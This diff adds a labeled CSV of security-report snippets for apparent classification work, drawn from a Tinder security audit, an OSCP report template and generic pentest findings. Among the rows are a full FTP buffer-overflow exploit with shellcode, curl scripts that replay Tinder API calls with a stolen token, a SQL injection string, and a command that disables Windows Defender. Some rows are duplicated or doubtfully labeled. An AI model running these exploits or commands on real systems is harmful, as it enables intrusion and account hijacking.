@@ -1,0 +1,532 @@
+text,label
+The code to prompt the user if they want to migrate always runs due to a logic bug. Not a security issue.,Background Information
+Tinder Security Audit,Background Information
+SSN Project 2013,Background Information
+Joris Claassen Leendert v. Duijn Mick Pouw Esan Wit,Background Information
+"{Joris.Claassen,Leendert.vanDuijn,Mick.Pouw,Esan.Wit}@os3.nl",Background Information
+"Dating apps are common place in society. Many dating apps include the option to contact matched users and send text messages or images. Due to the amount of personal information potentially involved in the matchmaking process this a prime target for identity theft. If an app or service deals with personal information, it has to ensure the security of this private information. Since the Tinder application has a lot of users, it would be interesting to check this security.",Background Information
+"The user has to supply some information before using the app. This includes a Facebook profile API credentials and eventually even GPS information. The information that can be collected from the Facebook profile could be valuable for eavesdroppers or third parties. Information like GPS, the actual location of the end user.",Background Information
+"In this paper we will look in to the risks of using Tinder, what information is sent where and how securely this information is transported over the internet. We also look into whether information is stored at a third party or even Tinder itself. ",Background Information
+ We will first discuss the materials and methods we used to research the Tinder application. We will then discuss the analysis we did on the Tinder application. eg. The offline and onlineanalysis. We will discuss certain,Background Information
+draw a conclusion based on our results. We divided the research questions into several sub questions. These will be handled in the analysis. The sub,Background Information
+ ## Offensive Security OSCP Exam Penetration Test Report The OffSec Lab and Exam penetration test report contains all efforts that were conducted in order to pass the OffSec course. This report should contain all items that were used to pass the overall exam and it will be graded from a standpoint of correctness and fullness to all aspects of the exam. The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the OffSec Certified Professional.,Background Information
+"The objective of this assessment is to perform an internal penetration test against the OffSec Lab and Exam network. The student is tasked with following a methodical approach to obtaining access to the objective goals. This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report. An example page has already been created for you in the latter",Background Information
+" This information will most likely be stored indefinitely and used for legitimate purposed as advertised and permitted by the terms, conditions and privacy statements of Tinder. ",Background Information
+Login page accepted admin:admin as default credentials.,Credential Access
+MySQL service allowed login with root and no password.,Credential Access
+"While enumerating table data, John was able to successfully extract
+the database root account login and password credentials that were
+unencrypted that also matched username and password accounts for the
+administrative user account on the system and John was able to log in
+remotely using RDP. This allowed for a successful breach of the
+operating system as well as all data contained on the system.",Credential Access
+"Manual enumeration of FTP allowed anonymous login, where multiple configuration files were found, including credentials.",Credential Access
+Accessed internal documentation from exposed Confluence server using default credentials.,Credential Access
+The web admin interface for the camera system was accessible via HTTP and used the default vendor credentials (`admin:admin`). These credentials allowed unrestricted configuration changes and full video access.,Credential Access
+Leveraged Kerberoasting to request service tickets and crack passwords offline.,Credential Access
+"An attacker with domain access was able to request service tickets for accounts with SPNs. These tickets were then cracked offline using hashcat, exposing cleartext passwords for several service accounts with elevated privileges.",Credential Access
+"#!/bin/sh
+### Replace : With
+### 11111111-2222-3333-4444-555555555555 : Currently valid token
+### 2000-12-09T14:55:30.356Z : Earliest time the history includes
+curl -v ""https://api.gotinder.com/updates"" \
+-H ""X-Auth-Token: 11111111-2222-3333-4444-555555555555"" \
+-A ""Tinder Android Version 2.0.1"" \
+-H ""Content-Type: application/json; charset=utf-8"" \
+-d '{""last_activity_date"":""2000-12-09T14:55:30.356Z""}'",Credential Access
+"The mobile app stored long-lived Facebook access tokens in plaintext local storage. These tokens were sent with each request, and due to CORS misconfiguration, a malicious site could potentially steal them via cross-site scripting.",Credential Access
+"If the Storage Provider URL is empty, an empty salt is used without warning.",Crypto Misuse
+"The salt passed to PBKDF2 is a hex string, which is suboptimal.",Crypto Misuse
+"Instead of using base64 or raw binary values, salts were derived from the hash of the current timestamp, leading to collisions and predictability under high concurrency environments.",Crypto Misuse
+Only 100 iterations of PBKDF2 are used when deriving the encryption password. This low value was explicitly chosen for performance reasons.,Crypto Misuse
+"The system used a single iteration of SHA-1 for password storage instead of a dedicated key derivation function like PBKDF2, bcrypt, or scrypt. This makes brute-force attacks significantly more feasible.",Crypto Misuse
+The HMAC key used during password derivation is a hex-encoded string.,Crypto Misuse
+"Hash0 derives another 'encryption password' from the main password, rather than using a binary key.",Crypto Misuse
+"The cryptographic module allowed keys with non-uniform entropy and improper padding, such as short ASCII passphrases padded to key length with null bytes. This undermines the strength of symmetric encryption.",Crypto Misuse
+The salts are generated with Math.random(). This is insecure. Salts must be generated with a CSPRNG.,Crypto Misuse
+The encryption password is derived from the master password with a constant salt.,Crypto Misuse
+The encryption key is derived from the master key with a fixed salt; more secure design needed.,Crypto Misuse
+"The password hashing implementation used `Math.random()` to generate salts. This method is not cryptographically secure and could lead to predictable salts, allowing precomputed dictionary attacks using rainbow tables.",Crypto Misuse
+"All user passwords were hashed using the same hardcoded salt value (`""somesaltvalue""`) across the application. This reduces entropy and makes it possible to precompute hashes offline for reuse against any account.",Crypto Misuse
+"Keys were derived by concatenating the password and username directly (e.g., `key = SHA256(password + username)`), bypassing standard key derivation libraries and lacking salting or iteration controls.",Crypto Misuse
+"Application generated encryption keys by hashing raw passwords directly with SHA1, skipping standard KDF mechanisms like PBKDF2, bcrypt, or scrypt.",Crypto Misuse
+"Keys were generated by reversing the user's birthdate and concatenating it with a static site-wide string, without salting or stretching.",Crypto Misuse
+"The custom encryption module did not validate the key size before accepting user-provided keys, allowing weak or improperly sized inputs that failed to meet minimum security standards for AES encryption.",Crypto Misuse
+"The encryption routine accepted user-provided keys without enforcing length or entropy requirements, resulting in the use of 40-bit keys for AES-256 encryption.",Crypto Misuse
+"The API failed to validate the initialization vector (IV) size before processing decryption, leading to truncated inputs that weakened cryptographic strength.",Crypto Misuse
+"The system derived keys using the users email address as the seed for a deterministic PRNG, resulting in predictable and replicable encryption keys for each user.",Crypto Misuse
+"Encryption keys for each session were derived from the user’s username and timestamp, enabling attackers to precompute likely key values.",Crypto Misuse
+"A global key derivation pattern based on incremental user IDs (e.g., `key = hash(1000 + user_id)`) made it trivial to guess keys for other users.",Crypto Misuse
+Using PBKDF2 then HMAC is unnecessary; better to encode in the PBKDF2 salt directly.,Crypto Misuse
+"The application encrypted data using AES-128, then applied a second, independent encryption layer using a custom XOR cipher. This provided no additional security benefit and introduced unnecessary complexity and potential for error.",Crypto Misuse
+"**Vulnerability Fix**: Since this is a custom web application, a specific update will not
+properly solve this issue. The application will need to be programmed
+to properly sanitize user-input data, ensure that the user is running
+off of a limited user account, and that any sensitive data stored
+within the SQL database is properly encrypted.",Crypto Misuse
+"The encryption routine used ECB mode, which does not sufficiently protect against block replay attacks. A mode like CBC or GCM should be used instead.",Crypto Misuse
+"User passwords were stored using unsalted MD5 hashes, which can be cracked rapidly using rainbow tables. Stronger, salted algorithms like bcrypt are recommended.",Crypto Misuse
+" Decompilation of the Tinder APK file provided some clear insights for fur- ther research. It provided us with a list of libraries used by Tinder, API endpoints, and some clarification on the authentication scheme used.",Discovery
+ Due to incomplete obfuscation of the APK10 file certain resources could easily be identified. The base URL of the Tinder API was also revealed to be https://api.gotinder.com.,Discovery
+"URL_MEDIA_BASE = ""/media"";URL_MEDIA = ""https://content.gotinder.com"" + URL_MEDIA_BASE; URL_USER_BASE = URL_BASE + ""/user/""; URL_AUTH = URL_BASE + ""/auth""; URL_MATCHES = URL_USER_BASE + ""matches/""; URL_PING = URL_USER_BASE + ""ping""; URL_PROFILE = URL_USER_BASE + ""profile""; URL_RECS = URL_USER_BASE + ""recs""; URL_UPDATES = URL_BASE + ""/updates""; URL_REGISTER_PUSH = URL_BASE + ""/device/android""; URL_DESTINATIONS_LIST = URL_BASE + ""/destinations""; URL_DESTINATION = URL_BASE + ""/destinations/""; URL_REPORT = URL_BASE + ""/report/""; URL_LIKE_ADJUNCT = ""/like""; URL_PASS_ADJUNCT = ""/pass"";",Discovery
+We also found that the API is adding an X-Auth-Token header to each request with a token retrieved from the /auth endpoint.,Discovery
+Used DNS zone transfer on misconfigured server to enumerate internal hostnames and IP addresses.,Discovery
+"Queried a misconfigured DNS server for AXFR records, successfully retrieving a full zone file containing all subdomains.",Discovery
+Performed reverse DNS lookups on discovered IP ranges to identify hostnames and network structure within the internal environment.,Discovery
+"### Target #1 - 192.168.x.1
+
+#### Service Enumeration
+
+##### Port Scan Results
+
+|IP Address|Ports Open|
+|---|---|
+|192.168.x.1|**TCP**: 8080<br/>**UDP**: 1433, 3389|",Discovery
+"#### Service Enumeration
+
+##### Port Scan Results
+
+|IP Address|Ports Open|
+|---|---|
+|192.168.x.2|**TCP**: 80, 443<br/>**UDP**:|
+",Discovery
+"### Target #1 - 192.168.x.3
+
+#### Service Enumeration
+
+##### Port Scan Results
+
+|IP Address|Ports Open|
+|---|---|
+|192.168.x.1|**TCP**: 80, 443<br/>**UDP**: 1433, 3389|",Discovery
+"The initial scanning revealed several services running on open ports:
+- Port 21 (FTP)
+- Port 22 (SSH)
+- Port 80 (HTTP)",Discovery
+Scanned subnet with Nmap and discovered open FTP and SSH ports.,Discovery
+" Our research focuses on several particular attack vectors against the plat- form. We will analyze several aspects of the application. User authentica-tion, authentication of API server(s), possible user-base enumeration, and leaking of information via side channels. We will investigate this by using a combination of static offline analysis of the program code and analysis of live network traffic.",Discovery
+The static analysis of the Tinder application was by decompiling the source files from a retrieved APK file using APK to Java1. This APK file has been retrieved from a rooted android device. The decompiler used was the freely available jd-gui[4].,Discovery
+"The purpose of the static analysis is to extract some information on how Tinder is implemented. We focus on which libraries are used, how communication is handled and if there are any obvious flaws in the implementation.
+We will also attempt to extract the structure of their API for later use.",Discovery
+ The network traffic was analyzed by using a Man in the Middle(MitM) attack. To do this we setup an access-point using a laptop and airbase-ng2. The access point would then forward all requests via iptables to our proxy.,Discovery
+ To complete our MitM setup we needed to proxy HTTP(S) requests and fake certificates for the various requested web resources. Because we wanted to analyze all requests we chose to set our proxy in transparent setup as opposed to defining the proxy in the WiFi settings. Reason for this is that applications on Android don't use the proxy as configured in the WiFi settings. As such we required a proxy which could generate SSL certificates for the various end-points requested by the application. ,Discovery
+First we used the Burp suite[5]. This program sat as a proxy between client and server but allowed the user to change the data in the middle. This would allow us to change request and response data without having to create a placeholder server. However it turned out that Burp did not have the option to run completely transparent and serve proper SSL certificates.,Discovery
+"After this we had a brief look into using MitM proxy3, as this was pre- viously used for exactly this purpose in another analysis[1]. However we didn -t manage to configure it to run transparently with our setup",Discovery
+Finally we settled on an implementation using SSLsplit4. This allowed us to use our own certificate authority to generate proper SSL certificates for any endpoint connected to during our tests. By importing this authority we were able to run the Tinder application while logging all traffic to plaintext files for later inspection. However for a casual attacker this would be highly impractical as we had to manually install the certificate authority and accept severe warnings to get it to work. ,Discovery
+" After having concluded our offline analysis we started our online analysis, using our test setup as described in section 3.2.1. During this process we had two test users run the app on several occasions, both instructions to generate a representative stream of requests for a complete analysis of ap- plication behavior and possible weaknesses. We inspected the logs collected to investigate where certain data was sent, whether it was secured in transit, and whether there were other feature worth investigating.",Discovery
+" We inspected the hosts the device running the application connected to, after eliminating traffic from non Tinder related hosts we were left with the following hosts using HTTPS: Number of requests Hostname 66 api.crittercism.com 3635 api.gotinder.com",Discovery
+Enumerated SMB shares using smbclient and found accessible shares.,Discovery
+had administrative level access to multiple systems. All systems were successfully exploited and access granted. These systems as well as a brief description on how access was obtained are listed below: - `192.168.x.1` - Anonymous SMB share leads to Wordpress RCE,Discovery
+" The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailedinformation on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.",Discovery
+"**Steps to reproduce**: Ran the initial service scan John discovered that this host is called
+Sehnzi. Smbclient was used to interact on the port 445 to get the
+passwords.txt file from SMB share shenzi and",Discovery
+ #### Privilege Escalation - MySQL Injection,Discovery
+Passwordmaker uses charAt() which could be exploited in a side-channel attack.,Discovery
+"Timing variations were observed in the password comparison logic, indicating that a timing side-channel could be exploited to infer valid characters.",Discovery
+"The encryption function leaked processing time differences based on input values, enabling potential attackers to recover key material through repeated measurements.",Discovery
+"By analyzing CPU cache behavior during repeated operations, the attacker could identify memory access patterns linked to sensitive information.",Discovery
+Tinder uses several libraries which appear to have code enabling network connectivity. These libraries may provide a channel from which information may be obtained. The libraries found are: Apphance5 Usage analysis and user feedback syndication. Crittercism6 Analytics and trend development. Facebook7 User authentication. Kontagent8 Analytics and trend development. Volley9 Android networking library.,Discovery
+"Apphance, Crittercism and Kontagent are all products related to app usage analysis. Apphance seems to be dedicated to analysis of app crashes. Since the app did not crash during testing we have not intercepted any re- quest of Apphance. Crittercism and Kontagent are used for usage analytics. Crittercism seems to be focused on application usage and device statistics whilst Kontagent seems focused on user details and interactions.",Discovery
+"Tinder requires its users to register and log in using Facebook. Facebook log in uses a token which, once generated, can be used by any interested party. As such it might be possible to log a user in with a third party Facebook token. To check this we will attempt a log in request to the API of Tinder and replace their Facebook token with one of our own. If Tinder does not verify whether or not the supplied token is created using their own Facebook app this will allow any Facebook app owner to attempt to log in to Tinder for a user.",Discovery
+" If it is possible to log in to the Tinder API using a random access token from another application this may enable third parties to profile users of Tinder or manipulate existing contacts, current recommendations, and chat conversations",Discovery
+ Facebook is used for user registration and log in. The app retrieves an authorized token from the library which is used to log in with the Tinder backend.,Discovery
+A Nikto scan was run against the HTTP service revealing outdated software and potential misconfigurations.,Discovery
+"A Nessus scan identified several critical CVEs affecting the web server, including remote code execution and privilege escalation vulnerabilities.",Discovery
+"An OpenVAS scan revealed multiple high-risk vulnerabilities in the backend database service, including weak authentication and exposed admin interfaces.",Discovery
+"A Qualys scan was performed against the DMZ subnet, highlighting outdated SSL configurations and missing security patches across several hosts.",Discovery
+Exposed Jenkins dashboard allowed anonymous command execution on build nodes.,Exploitation
+Exposed Jenkins dashboard allowed anonymous command execution on build nodes.,Exploitation
+An attacker exploited a misconfigured GitLab runner to gain shell access on the build environment.,Exploitation
+Unauthorized access to Bamboo server allowed the attacker to execute arbitrary scripts during the build pipeline.,Exploitation
+"Initial Access - Buffer Overflow
+Vulnerability Explanation: Ability Server 2.34 is subject to a buffer overflow vulnerability in STOR field. Attackers can use this vulnerability to cause arbitrary remote code execution and take completely control over the system.",Exploitation
+"Steps to reproduce: The operating system was different from the known public exploit. A rewritten exploit was needed in order for successful code execution to occur. Once the exploit was rewritten, a targeted attack was performed on the system which gave John full administrative access over the system.",Exploitation
+"PoC: Modifications to the existing exploit were needed and are marked with comments:
+
+  ###################################
+  # Ability Server 2.34 FTP STOR Buffer Overflow
+  # Advanced, secure and easy to use FTP Server.
+  # 21 Oct 2004 - muts
+  ###################################
+  # D:\BO>ability-2.34-ftp-stor.py
+  ###################################
+  # D:\data\tools>nc -v 127.0.0.1 4444
+  # localhost [127.0.0.1] 4444 (?) open
+  # Microsoft Windows XP [Version 5.1.2600]
+  # (C) Copyright 1985-2001 Microsoft Corp.
+  # D:\Program Files\abilitywebserver>
+  ###################################
+
+  import ftplib
+  from ftplib import FTP
+  import struct
+  print ""\n\n################################""
+  print ""\nAbility Server 2.34 FTP STOR buffer Overflow""
+  print ""\nFor Educational Purposes Only!\n""
+  print ""###################################""
+
+  # Shellcode taken from Sergio Alvarez's ""Win32 Stack Buffer Overflow Tutorial""
+
+  sc = ""\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xe0\x66""
+  sc += ""\x1c\xc2\x83\xeb\xfc\xe2\xf4\x1c\x8e\x4a\xc2\xe0\x66\x4f\x97\xb6""
+  sc += ""\x1a\x38\xd6\x95\x87\x97\x98\xc4\x67\xf7\xa4\x6b\x6a\x57\x49\xba""
+  sc += ""\x7a\x1d\x29\x6b\x62\x97\xc3\x08\x8d\x1e\xf3\x20\x39\x42\x9f\xbb""
+  sc += ""\xa4\x14\xc2\xbe\x0c\x2c\x9b\x84\xed\x05\x49\xbb\x6a\x97\x99\xfc""
+  sc += ""\xed\x07\x49\xbb\x6e\x4f\xaa\x6e\x28\x12\x2e\x1f\xb0\x95\x05\x61""
+  sc += ""\x8a\x1c\xc3\xe0\x66\x4b\x94\xb3\xef\xf9\x2a\xc7\x66\x1c\xc2\x70""
+  sc += ""\x67\x1c\xc2\x56\x7f\x04\x25\x44\x7f\x6c\x2b\x05\x2f\x9a\x8b\x44""
+  sc += ""\x7c\x6c\x05\x44\xcb\x32\x2b\x39\x6f\xe9\x6f\x2b\x8b\xe0\xf9\xb7""
+  sc += ""\x35\x2e\x9d\xd3\x54\x1c\x99\x6d\x2d\x3c\x93\x1f\xb1\x95\x1d\x69""
+  sc += ""\xa5\x91\xb7\xf4\x0c\x1b\x9b\xb1\x35\xe3\xf6\x6f\x99\x49\xc6\xb9""
+  sc += ""\xef\x18\x4c\x02\x94\x37\xe5\xb4\x99\x2b\x3d\xb5\x56\x2d\x02\xb0""
+  sc += ""\x36\x4c\x92\xa0\x36\x5c\x92\x1f\x33\x30\x4b\x27\x57\xc7\x91\xb3""
+  sc += ""\x0e\x1e\xc2\xf1\x3a\x95\x22\x8a\x76\x4c\x95\x1f\x33\x38\x91\xb7""
+  sc += ""\x99\x49\xea\xb3\x32\x4b\x3d\xb5\x46\x95\x05\x88\x25\x51\x86\xe0""
+  sc += ""\xef\xff\x45\x1a\x57\xdc\x4f\x9c\x42\xb0\xa8\xf5\x3f\xef\x69\x67""
+  sc += ""\x9c\x9f\x2e\xb4\xa0\x58\xe6\xf0\x22\x7a\x05\xa4\x42\x20\xc3\xe1""
+  sc += ""\xef\x60\xe6\xa8\xef\x60\xe6\xac\xef\x60\xe6\xb0\xeb\x58\xe6\xf0""
+  sc += ""\x32\x4c\x93\xb1\x37\x5d\x93\xa9\x37\x4d\x91\xb1\x99\x69\xc2\x88""
+  sc += ""\x14\xe2\x71\xf6\x99\x49\xc6\x1f\xb6\x95\x24\x1f\x13\x1c\xaa\x4d""
+  sc += ""\xbf\x19\x0c\x1f\x33\x18\x4b\x23\x0c\xe3\x3d\xd6\x99\xcf\x3d\x95""
+  sc += ""\x66\x74\x32\x6a\x62\x43\x3d\xb5\x62\x2d\x19\xb3\x99\xcc\xc2""
+  # Change RET address if need be.
+  buffer = '\x41'*966+struct.pack('<L', 0x7C2FA0F7)+'\x42'*32+sc # RET Windows 2000 Server SP4
+  #buffer = '\x41'*970+struct.pack('<L', 0x7D17D737)+'\x42'*32+sc # RET Windows XP SP2
+  try:
+      # Edit the IP, Username and Password.
+      ftp = FTP('127.0.0.1')
+      ftp.login('ftp','ftp')
+      print ""\nEvil Buffer sent...""
+      print ""\nTry connecting with netcat to port 4444 on the remote machine.""
+  except:
+      print ""\nCould not Connect to FTP Server.""
+
+  try:
+      ftp.transfercmd(""STOR "" + buffer)
+  except:
+      print ""\nDone.""",Exploitation
+"**Vulnerability Explanation**: After establishing a foothold on target, John noticed there were
+several applications running locally, one of them, a custom web
+application on port 80 was prone to SQL Injection attacks. Using
+Chisel for port forwarding, John was able to access the web
+application. When performing the penetration test, John noticed
+error-based MySQL Injection on the taxid query string parameter.
+",Exploitation
+**Steps to reproduce**: Execute the injection on the taxid query string parameter.,Exploitation
+"**PoC**:
+Injection code:
+
+```sql
+SELECT * FROM login WHERE id = 1 or 1=1 AND user LIKE ""%root%""
+```",Exploitation
+Analyzing files left behind by the app on the system opened up some new locations where data could be leaked. Most noteworthy is the tinder.db file which is an unencrypted SQLite3 database. This database houses informa- tion on past and future gradings as well as a complete chat history. Since this files is protected by Android to only be accessible by the app itself this is generally okay. However on rooted devices or with the possibility of a new exploit encryption might be preferable over the performance loss.,Exploitation
+Cached files on device included screenshots of user activity logs and partial authentication tokens in plain text.,Exploitation
+"User credentials and session tokens were stored unencrypted in browser localStorage, accessible via any loaded script.",Exploitation
+Captured NTLMv2 hashes via LLMNR spoofing and used them in an SMB relay attack.,Exploitation
+Used responder to poison LLMNR requests and capture NTLMv2 hashes on the internal network.,Exploitation
+"Tricked a victim into connecting to a rogue SMB share via LLMNR/NBT-NS spoofing, captured credentials, and relayed them for access.",Exploitation
+Used kernel exploit to escalate privileges from user to root.,Exploitation
+#### Privilege Escalation - Scripts running as root user ,Exploitation
+"#### Initial Access - Anonymous SMB share leads to Wordpress RCE
+
+**Vulnerability Explanation**: The SMB server is not protected with the password and has some
+sensitive information like credentials stored. Which leads to RCE
+from wordpress theme editor.
+
+
+**Severity**: Critical
+",Exploitation
+"**Steps to reproduce**: We can find the script by running a LinEnum enumeration suite on the system. Since the script
+is written in bash and it can be changed, we can edit it and add a reverse shell command.
+When the script is executed by cron, we'll get a reverse shell under root user.",Exploitation
+Attacker exploited an outdated Apache Struts installation to gain shell access via a crafted HTTP request.,Exploitation
+"RCE achieved by uploading a malicious PHP file through an unrestricted file upload form, then accessing it via the web.",Exploitation
+Exploited deserialization flaw in the application -s API endpoint to execute arbitrary commands on the backend server.,Exploitation
+"Compromised Jenkins pipeline through script console, allowing arbitrary code to run on build agents.",Exploitation
+Used insecure YAML parser to execute OS commands via a manipulated configuration file.,Exploitation
+"The Storage Provider could replay old ciphertext, leading to password reuse or rollback.",Exploitation
+Inspecting our logged traffic we located some legitimate chat traffic in order to test whether we could automate the chat functionality. For this we used 3 parties: *The user *The chat partner *The third party,Exploitation
+"With the user having sent a test message to the chat partner our third
+party took the network logs and crafted another request, this crafted re-
+quest was then sent to the Tinder API server which accepted, processed
+and relayed it to the original chat partner. The conversation can be found
+in appendix B.1. During this experiment we noticed that while our chat
+partner received the message, the user on whose behalf we sent it did not
+get any notication in their chat log. We suspect the latter to be due to the
+response to the actual message being sent containing the information the
+application would normally add to the chat log.
+Execution of this attack requires the following resources:
+ The template API request (see appendix A.1)
+ The identier of a match with the target user
+ A (currently) valid authentication token for the sending user
+ The application version identier i.e. the user agent for the request
+ A properly encoded JSON payload specifying a message",Exploitation
+"This attack shows that it is possible to write a simple chat bot, even if
+you would have to resort to someone manually creating matches with other
+users. There are strong indicators that spam bots are active on Tinder [8],
+we suspect that automation like we demonstrated is used for these purposes.",Exploitation
+We wondered how the system would respond to replacing the Match-ID with a User-ID.,Exploitation
+"#!/bin/sh
+### Replace : With
+### 888888888888888888888888 : Match ID
+### 11111111-2222-3333-4444-555555555555 : Currently valid token
+### Tinder testbericht 4 : A message approved by the token's owner
+curl -v ""https://api.gotinder.com/user/matches/888888888888888888888888"" \
+-H ""X-Auth-Token: 11111111-2222-3333-4444-555555555555"" \
+-A ""Tinder Android Version 2.0.1"" \
+-H ""Content-Type: application/json; charset=utf-8"" \
+-H ""Accept-Encoding: gzip"" \
+-d '{""message"":""Tinder testbericht""}'",Exploitation
+"* Connected to api.gotinder.com (54.236.172.128) port 443 (#0)
+* SSL connection using DHE-RSA-AES256-SHA
+* SSL certificate verify ok.
+> POST /user/matches/333333333333333333333333 HTTP/1.1
+> User-Agent: Tinder Android Version 2.0.1
+> Host: api.gotinder.com
+> X-Auth-Token: 99999999-8888-7777-6666-555555555555
+> Content-Type: application/json; charset=utf-8
+> Accept-Encoding: gzip
+> Content-Length: 34
+
+* upload completely sent off: 34 out of 34 bytes
+< HTTP/1.1 200 OK
+< Content-Type: application/json; charset=utf-8
+{
+  ""created_date"": ""2013-12-09T10:00:00.000Z"",
+  ""from"": ""aaaaaaaaaaaaaaaaaaaaaaaa"",
+  ""to"": ""bbbbbbbbbbbbbbbbbbbbbbbb"",
+  ""message"": ""Tinder testbericht 3""
+}",Exploitation
+Tinder is a dating app that is being used by many users on a global scale. The Tinder application requires a Facebook profile as well as GPS location to function properly. Tinder claims not to share this information with other users. Since personal information like sexual preferences or your location is highly sensitive data it should be properly secured. This audit focuses on testing whether or not Tinder uses avail- able technologies to withstand common attacks. Whilst most known leaks in Tinder appear to no longer be around there are still some points of concern. It turns out that there is an insecure connection which sends user preferences and GPS data to an analytics company. ,Exploitation
+We also saw a large number of requests going to non-HTTPS endpoints. Closer inspection revealed the following endpoints to receive non-encrypted requests: images.gotinder.com and api.geo.kontagent.net.,Exploitation
+"Of these, the most interesting seems to be api.geo.kontagent.net, which received: age, gender, user ID, 7-decimal location, sexual interest, and target user ID.",Exploitation
+We discovered the application retrieves history from the server by making a call to api.gotinder.com.,Exploitation
+"It returned chat history, user profiles, last online timestamps, and rejected matches.",Exploitation
+This answers whether the undocumented Tinder API is prone to leaking data.,Exploitation
+"Tinder sends highly private information over the network. The information
+that is transferred to Kontagent contains the GPS location, gender, age,
+sexual preference, user number and Tinder ID. This can be intercepted by
+an eavesdropper, since the traffic is not encrypted.",Exploitation
+"Data gathered by third party API's can be gathered during the use of Tinder.
+When the Tinder account is deleted, this information will remain stored on
+with the third parties. The stored information cannot be deleted. Third
+parties can sell or use this information for targeted add. All of this is
+according to Tinders privacy statement the user agreed upon.",Exploitation
+"Some issues remain, including third-party analytics receiving sensitive data over insecure channels.",Exploitation
+"Sensitive data, including database backups and plaintext credentials, were located in /var/backups and /etc/passwd respectively.",Exploitation
+"One of the first attacks tried on the Tinder API was to check if we could exchange a third party Facebook token for a Tinder session token. We send a fully authorized token, created from the Facebook Graph API Explorer11.",Exploitation
+"One of the first attacks tried on the Tinder API was to check if we could exchange a third party Facebook token for a Tinder session token. We send a fully authorized token, created from the Facebook Graph API Explorer11.",Exploitation
+Attackers reused session tokens from stolen browser sessions to bypass login.,Exploitation
+"Third-party API integration failed to validate JWT issuer, allowing forged tokens to access user accounts.",Exploitation
+"Pages could lie about their URL, tricking the app into giving a password to the wrong domain.",Exploitation
+"Pages could lie about their URL, tricking the app into giving a password to the wrong domain.",Exploitation
+User was tricked into clicking a link that appeared to belong to their company domain but led to a malicious site that stole credentials.,Exploitation
+Browser autofill filled credentials into a phishing site with a spoofed subdomain.,Exploitation
+"What users might not realize is the insecure channel used for this, enabling a motivated third party to passively inspect and log it.",Exploitation
+"What users might not realize is the insecure channel used for this, enabling a motivated third party to passively inspect and log it.",Exploitation
+Sensitive data transmitted over HTTP allowed an attacker on the same network to capture login details.,Exploitation
+"Mobile app failed to enforce HTTPS, exposing login credentials over open Wi-Fi.",Exploitation
+22-Dec-13,Formatting
+Abstract,Formatting
+Contents,Formatting
+1 Introduction 2,Formatting
+2 Related Work 3,Formatting
+3 Materials and Methods 4,Formatting
+3.1 Static analysis . . . . . . . . . . . . . . . . . . . . . . . . . . 4,Formatting
+3.2 Network traffic . . . . . . . . . . . . . . . . . . . . . . . . . . 4,Formatting
+3.2.1 HTTP(S) Proxies . . . . . . . . . . . . . . . . . . . . . 4,Formatting
+3.2.2 Realization . . . . . . . . . . . . . . . . . . . . . . . . 5,Formatting
+3.3 User authentication. . . . . . . . . . . . . . . . . . . . . . . . 5,Formatting
+4 Analysis 6,Formatting
+4.1 Offline analysis . . . . . . . . . . . . . . . . . . . . . . . . . . 6,Formatting
+4.1.1 Libraries . . . . . . . . . . . . . . . . . . . . . . . . . . 6,Formatting
+4.1.2 API resources . . . . . . . . . . . . . . . . . . . . . . . 6,Formatting
+4.1.3 Local storage . . . . . . . . . . . . . . . . . . . . . . . 7,Formatting
+4.2 Dynamic analysis . . . . . . . . . . . . . . . . . . . . . . . . . 7,Formatting
+4.2.1 Secured traffic . . . . . . . . . . . . . . . . . . . . . . 7,Formatting
+4.2.2 Insecure traffic . . . . . . . . . . . . . . . . . . . . . . 8,Formatting
+4.2.3 Targeting authentication . . . . . . . . . . . . . . . . . 9,Formatting
+4.2.4 Replay attacks . . . . . . . . . . . . . . . . . . . . . . 9,Formatting
+4.2.5 Data retrieval . . . . . . . . . . . . . . . . . . . . . . . 10,Formatting
+4.3 Legal analysis . . . . . . . . . . . . . . . . . . . . . . . . . . . 11,Formatting
+4.3.3 Privacy concerns . . . . . . . . . . . . . . . . . . . . . 12,Formatting
+5 Conclusion 13,Formatting
+References 14,Formatting
+A Scripts 15,Formatting
+### Objective,Formatting
+### Requirements,Formatting
+## High-Level Summary,Formatting
+**Active Directory Set**:,Formatting
+### Recommendations,Formatting
+## Methodologies,Formatting
+The SJCL decrypt() function will throw an exception if the key is wrong or data is tampered. Hash0 does not handle this and crashes.,Implementation Flaw
+"The application fails to catch database connection exceptions, causing the entire system to crash when the database is unavailable.",Implementation Flaw
+"During invalid input processing, the system throws unhandled exceptions that leak internal stack trace information to the client.",Implementation Flaw
+"When authentication fails due to a malformed token, the application crashes instead of gracefully rejecting the request.",Implementation Flaw
+"Due to a race condition, a password could be inserted into the wrong browser tab.",Implementation Flaw
+"User session was validated before checking file permissions, allowing unauthorized access.",Implementation Flaw
+"The application checked for file existence before write, but the file was replaced in the interim.",Implementation Flaw
+Unfiltered user input passed directly to SQL or file paths,Implementation Flaw
+User tokens remain valid after logout or password reset.,Implementation Flaw
+Incorrect checks in backend controllers exposing privileged functions.,Implementation Flaw
+Returning full stack traces or database errors instead of sanitized messages.,Implementation Flaw
+Two processes modifying the same resource due to missing synchronization.,Implementation Flaw
+" Custom error messages
+are highly recommended, as it becomes more challenging for the
+attacker to exploit a given weakness if errors are not being
+presented back to them.",Information Disclosure
+"The application returned full stack traces when invalid input was submitted, revealing framework and version information to the user.",Information Disclosure
+"A login page error message disclosed whether the username or password was incorrect, aiding user enumeration.",Information Disclosure
+"The password is shown to the user before settings are uploaded, allowing reuse in case of failure.",Information Disclosure
+User credentials were visible in the browsers address bar after a failed login attempt.,Information Disclosure
+Temporary password was displayed in plain text during password reset process.,Information Disclosure
+Detailed server-side stack traces exposed to user,Information Disclosure
+Revealing software versions or internal IPs via headers like Server: or X-Powered-By.,Information Disclosure
+"Sensitive files (e.g., .git, .env) accessible from the web root.",Information Disclosure
+Unintended exposure of file structures and names in public folders.,Information Disclosure
+Returning full records (including PII) when users access objects they shouldn't,Information Disclosure
+Disabled Windows Defender via registry edits before payload deployment.,Operational TTPs
+"During the engagement, the red team deployed a PowerShell script that disabled Windows Defenders real-time protection using `Set-MpPreference -DisableRealtimeMonitoring $true`, allowing payloads to execute without detection.",Operational TTPs
+Exported entire customer database from a misconfigured public S3 bucket.,Operational TTPs
